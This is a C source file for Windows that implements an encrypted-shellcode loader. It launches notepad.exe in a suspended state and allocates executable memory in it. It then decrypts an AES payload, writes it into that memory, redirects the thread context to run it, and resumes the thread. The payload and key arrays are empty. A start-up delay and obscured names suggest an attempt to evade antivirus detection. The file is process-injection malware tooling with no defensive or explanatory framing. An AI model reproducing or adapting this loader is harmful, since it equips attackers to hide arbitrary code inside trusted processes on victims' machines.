
#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void encaeshello(char* code1299d, DWORD code1299dLen, char* k27eykk, DWORD k27eykkLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)k27eykk, k27eykkLen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)code1299d, &code1299dLen);

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

int main() {
    Sleep(2000);

    
    unsigned char ke185hams[] = {};
    unsigned char itsthecod345[] = {}; 

    // Create a new process in a suspended state
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
      

    
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;

    GetThreadContext(pi.hThread, &ctx);

    LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, sizeof(itsthecod345),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    // Decrypt the payload
    encaeshello((char*)  itsthecod345, sizeof(itsthecod345), ke185hams, sizeof(ke185hams));

    // Write payload to target process
    WriteProcessMemory(pi.hProcess, memlo, itsthecod345, sizeof(itsthecod345), NULL);
    // Update entry point
    ctx.Rcx = (DWORD64)memlo; // Use Rcx for x64 processes
    SetThreadContext(pi.hThread, &ctx);

    // Resume thread to execute payload
    ResumeThread(pi.hThread); 

    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
